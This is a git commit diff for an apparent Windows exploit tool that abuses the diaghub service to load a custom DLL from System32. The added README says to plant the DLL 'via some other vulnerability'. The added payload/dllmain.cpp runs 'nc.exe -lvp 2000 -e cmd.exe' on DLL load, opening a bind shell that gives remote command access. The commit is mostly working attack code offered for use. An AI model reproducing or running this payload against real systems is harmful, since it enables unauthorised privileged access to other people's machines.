f1504432f0a19335ebe32b6974d346b3f5b61966
xct <xct@vulndev.io>
2019-07-22 13:18:12 +0200

    update

--- README.md
+++ README.md
@@ -4,3 +4,11 @@ Loads a custom dll in system32 via diaghub.
 
 * https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1
 * https://vulndev.io/2019/03/howto_diaghub.html
+
+Example:
+
+Get the dll via some other vulnerability into C:\Windows\System32 and run:
+```
+diaghub.exe c:\\ProgramData\\ xct.dll
+```
+The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
---
+++ payload/dllmain.cpp
@@ -0,0 +1,28 @@
+#include "pch.h"
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+
+int pwn()
+{
+	WinExec("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe", 0);
+	return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		pwn();
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
